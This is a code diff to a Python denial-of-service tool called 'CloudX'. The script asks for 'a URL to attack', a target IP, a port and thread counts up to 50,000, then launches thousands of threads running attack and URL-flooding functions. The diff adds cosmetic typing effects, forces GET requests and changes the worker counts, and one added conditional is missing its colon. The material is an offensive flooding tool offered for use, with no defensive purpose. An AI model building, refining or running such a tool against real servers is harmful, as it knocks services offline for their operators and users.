@@ -10,8 +10,28 @@ from urllib.parse import urlparse
 from concurrent.futures import ThreadPoolExecutor  # Added import
 import sys
 
+def type(text, delay=0.2):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+
+def type_with_protocol(url, delay=0.1):
+    protocol = "https://" if url.startswith("https://") else "http://"
+    url_without_protocol = url[len(protocol):]
+    
+    sys.stdout.write(protocol)
+    sys.stdout.flush()
+    time.sleep(delay)
+
+    for char in url_without_protocol:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+
 os.system('clear')
 print("POST Method is currently being fixed and it is error right now, please use GET instead.")
+print("")
 logo = """
 < =============== >
       CloudX
@@ -27,13 +47,19 @@ threads = ""
 method = ""
 maxThreads = int(50000)
 
+type("--------------------------")
 url = input("[+] Enter a URL to attack: ")
 ip = input("[+] Enter the target IP address: ")
 port = input("[+] Enter the target port (default: 80): ")
-numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
-method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
-print("[CHECK TRAFFIC!]")
-time.sleep(0.5)
+numberOfThreads = input("[+] Enter the desired number of threads (default: 16500) (max: 50000): ")
+method = input("[+] Enter 'GET' as the request method (default: GET): ")
+print("")
+type("URL Type:")
+type_with_protocol(url)
+type("--------------------------")
+time.sleep(2.5)
+type("Waiting CloudX to connect... || [METHOD: GET]")
+time.sleep(1.5)
 
 if port == "":
     port = str(80)
@@ -42,6 +68,8 @@ if numberOfThreads == "":
 if maxThreads < int(numberOfThreads):
     numberOfThreads = int(maxThreads)
 if method == "":
+    method = "GET"
+if method == "POST"
     method = "GET"
 
 # Construct attack parameters
@@ -145,11 +173,12 @@ def worker(requests_per_worker):
 default_threads = 16500
 for i in range(default_threads):
     threading.Thread(target=attack, args=(ip, port, i)).start()
-    threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
 threading.Thread(target=flood_url).start()
 
-num_workers = 800
-requests_per_worker = 300
+num_workers = 20
+requests_per_worker = 80
+
+threading.Thread(target=workers, args=(num_workers, requests_per_worker)).start()
 
 # NOTE
 """
